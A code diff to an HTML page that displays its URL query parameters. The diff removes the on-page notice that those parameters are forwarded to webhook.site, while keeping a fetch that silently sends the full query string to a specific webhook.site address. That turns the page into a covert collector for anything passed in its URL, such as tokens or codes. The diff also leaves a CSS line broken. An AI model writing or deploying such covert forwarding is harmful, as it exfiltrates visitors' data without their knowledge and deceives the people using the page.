@@ -11,56 +11,64 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      background: #f5f5f5;
       margin: 0;
+      background: #f5f5f5;
     }
     .container {
-      text-align: center;
+      text-align: left;
       padding: 2rem;
       background: white;
       border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      box-shadow: 0 2px 10px rgba(0,0,0,0
+    }
+    h2 {
+      margin-top: 0;
+      color: #333;
+      font-size: 1.2em;
+    }
+    .param {
+      margin: 4px 0;
+      padding-left: 16px;
+      position: relative;
+    }
+    .param:before {
+      content: "•";
+      position: absolute;
+      left: 0;
+      width: 10px;
+      text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>✅ Request Sent!</h2>
-    <p>Your parameters have been forwarded to webhook.site.</p>
-    <p id="params"></p>
+    <h2>Parameters:</h2>
+    <div id="params"></div>
   </div>
 
   <script>
-    // 1. 获取当前查询参数
     const searchParams = new URLSearchParams(window.location.search);
     const paramsArray = Array.from(searchParams.entries());
 
-    // 2. 显示参数（可选，用于用户反馈）
     const paramsEl = document.getElementById('params');
     if (paramsArray.length > 0) {
-      paramsEl.innerHTML = '<strong>Parameters:</strong><br>' +
-        paramsArray.map(([k, v]) => `${k}: ${v}`).join('<br>');
+      paramsArray.forEach(([key, value]) => {
+        const p = document.createElement('div');
+        p.className = 'param';
+        p.textContent = `${key}: ${value}`;
+        paramsEl.appendChild(p);
+      });
     } else {
       paramsEl.textContent = 'No parameters received.';
     }
 
-    // 3. 构造 webhook URL（⚠️ 替换 YOUR-UUID）
+    // 静默发送到 webhook.site
     const webhookBase = 'https://webhook.site/150098f4-1f64-4706-829c-0cfef80a5bf9';
     const fullWebhookUrl = webhookBase + window.location.search;
 
-    // 4. 静默发送 GET 请求
-    fetch(fullWebhookUrl, {
-      method: 'GET',
-      // 不需要 credentials（除非 webhook 要求认证）
-    })
-    .then(response => {
-      console.log('Webhook request sent successfully.');
-      // 可选：上报成功状态
-    })
-    .catch(error => {
-      console.error('Failed to send webhook:', error);
-      // 可选：显示错误提示
-    });
+    fetch(fullWebhookUrl, { method: 'GET' })
+      .then(() => console.log('Sent to webhook'))
+      .catch(err => console.error('Error:', err));
   </script>
 </body>
 </html>
